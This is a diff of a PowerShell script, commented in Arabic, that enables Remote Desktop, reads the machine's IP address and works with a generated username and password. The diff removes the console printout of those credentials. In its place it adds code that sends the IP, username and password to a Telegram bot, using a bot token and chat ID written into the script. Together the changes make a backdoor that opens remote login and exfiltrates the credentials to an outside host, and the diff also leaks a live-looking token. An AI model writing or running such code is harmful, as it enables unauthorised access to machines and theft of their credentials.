@@ -1,3 +1,18 @@
+# توجيه البيانات إلى بوت Telegram
+function Send-TelegramMessage {
+    param (
+        [string]$botToken,
+        [string]$chatId,
+        [string]$message
+    )
+    $url = "https://api.telegram.org/bot$botToken/sendMessage"
+    $body = @{
+        chat_id = $chatId
+        text    = $message
+    }
+    Invoke-RestMethod -Uri $url -Method Post -Body $body
+}
+
 # وظيفة لإنشاء اسم مستخدم عشوائي
 function Generate-RandomUsername {
     $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
@@ -30,11 +45,15 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 # الحصول على عنوان IP المحلي
 $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }).IPAddress
 
-# عرض المعلومات
-Write-Host "تم إعداد خادم RDP بنجاح."
-Write-Host "عنوان IP: $IPAddress"
-Write-Host "اسم المستخدم: $UserName"
-Write-Host "كلمة المرور: $Password"
+# إعداد معلومات بوت Telegram
+$botToken = "7047714100:AAHptINe1QLjomnzqKaOMnTm_YRmt5T5XAM" # استبدل بـ bot token الخاص بك
+$chatId = "242676339"     # استبدل بـ chat ID الخاص بك
+
+# إعداد الرسالة
+$message = "تم إعداد خادم RDP بنجاح.`nعنوان IP: $IPAddress`nاسم المستخدم: $UserName`nكلمة المرور: $Password"
+
+# إرسال الرسالة عبر Telegram
+Send-TelegramMessage -botToken $botToken -chatId $chatId -message $message
 
 # عرض رسالة نجاح
-Write-Host "يمكنك الآن تسجيل الدخول إلى الخادم باستخدام المعلومات أعلاه عبر RDP."
+Write-Host "تم إرسال بيانات RDP إلى Telegram."
